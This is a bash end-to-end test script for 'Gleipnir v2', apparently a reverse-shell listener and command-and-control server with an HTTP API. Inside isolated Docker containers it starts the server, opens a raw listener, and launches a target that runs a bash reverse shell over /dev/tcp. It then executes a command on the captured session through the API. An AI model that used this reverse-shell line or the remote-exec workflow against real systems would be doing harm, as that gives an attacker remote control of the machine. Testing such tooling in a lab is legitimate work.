#!/bin/bash
# Gleipnir v2 E2E test: server + raw listener + target revshell + CLI exec + HTTP API
set -euo pipefail

IMAGE="gleipnir-v2-test"
NETWORK="gleipnir-test-net"
SERVER="gleipnir-test-server"
TARGET="gleipnir-test-target"
API_PORT=16666
AGENT_PORT=14444
RAW_PORT=19001

cleanup() {
  echo "[cleanup] stopping containers..."
  docker rm -f "$SERVER" "$TARGET" 2>/dev/null || true
  docker network rm "$NETWORK" 2>/dev/null || true
}
trap cleanup EXIT

echo "=== Building gleipnir image ==="
docker build -t "$IMAGE" "$(dirname "$0")/.."

echo "=== Creating test network ==="
docker network create "$NETWORK" 2>/dev/null || true

echo "=== Starting gleipnir server ==="
docker run -d --name "$SERVER" --network "$NETWORK" \
  -p "$API_PORT:6666" -p "$AGENT_PORT:4444" \
  "$IMAGE" --no-tls --api-port 6666 --port 4444

sleep 2

echo "=== Health check ==="
HEALTH=$(curl -sf "http://localhost:$API_PORT/api/health" 2>/dev/null || echo "FAIL")
if [ "$HEALTH" = '{"status":"ok"}' ]; then
  echo "  [PASS] /api/health OK"
else
  echo "  [FAIL] health check: $HEALTH"
  exit 1
fi

echo "=== Info endpoint ==="
INFO=$(curl -sf "http://localhost:$API_PORT/api/info" 2>/dev/null)
echo "  $INFO"

echo "=== Default listeners ==="
LISTENERS=$(curl -sf "http://localhost:$API_PORT/api/listeners" 2>/dev/null)
echo "  $LISTENERS"
if echo "$LISTENERS" | grep -q '"mode":"agent"'; then
  echo "  [PASS] default agent listener present"
else
  echo "  [FAIL] no default listener"
  exit 1
fi

echo "=== Create raw listener on $RAW_PORT ==="
RAW_RESP=$(curl -sf -X POST "http://localhost:$API_PORT/api/listeners" \
  -H "Content-Type: application/json" \
  -d "{\"port\": $RAW_PORT, \"mode\": \"raw\"}" 2>/dev/null)
echo "  $RAW_RESP"
if echo "$RAW_RESP" | grep -q '"mode":"raw"'; then
  echo "  [PASS] raw listener created"
else
  echo "  [FAIL] raw listener creation failed"
  exit 1
fi

echo "=== Sessions (should be empty) ==="
SESSIONS=$(curl -sf "http://localhost:$API_PORT/api/sessions" 2>/dev/null)
echo "  $SESSIONS"

echo "=== Launching target with bash revshell ==="
docker run -d --name "$TARGET" --network "$NETWORK" \
  debian:bookworm-slim bash -c "sleep 2 && bash -i >& /dev/tcp/$SERVER/$RAW_PORT 0>&1"

echo "=== Waiting for session (max 15s) ==="
for i in $(seq 1 15); do
  SESSIONS=$(curl -sf "http://localhost:$API_PORT/api/sessions" 2>/dev/null || echo "[]")
  if echo "$SESSIONS" | grep -q '"mode":"raw"'; then
    echo "  [PASS] raw session detected at attempt $i"
    break
  fi
  sleep 1
  printf "."
done
echo ""

if ! echo "$SESSIONS" | grep -q '"mode":"raw"'; then
  echo "  [FAIL] no raw session appeared"
  docker logs "$SERVER" 2>&1 | tail -20
  exit 1
fi

# Extract session name
SESSION_NAME=$(echo "$SESSIONS" | python3 -c "import sys,json; s=[x for x in json.load(sys.stdin) if x.get('mode')=='raw']; print(s[0]['name'])" 2>/dev/null || echo "")
if [ -z "$SESSION_NAME" ]; then
  echo "  [FAIL] could not extract session name"
  exit 1
fi
echo "  Session name: $SESSION_NAME"

echo "=== Exec 'id' on raw session ==="
EXEC_RESP=$(curl -sf -X POST "http://localhost:$API_PORT/api/sessions/$SESSION_NAME/exec" \
  -H "Content-Type: application/json" \
  -d '{"command": "echo hello_gleipnir", "timeout": 10}' 2>/dev/null || echo "FAIL")
echo "  $EXEC_RESP"
if echo "$EXEC_RESP" | grep -q "hello_gleipnir"; then
  echo "  [PASS] exec returned expected output"
else
  echo "  [FAIL] exec output unexpected"
fi

echo "=== Agent listing ==="
AGENTS=$(curl -sf "http://localhost:$API_PORT/api/agents" 2>/dev/null || echo "[]")
echo "  $AGENTS"

echo "=== Kill session ==="
KILL=$(curl -sf -X DELETE "http://localhost:$API_PORT/api/sessions/$SESSION_NAME" 2>/dev/null || echo "FAIL")
echo "  $KILL"

echo ""
echo "=== ALL TESTS PASSED ==="
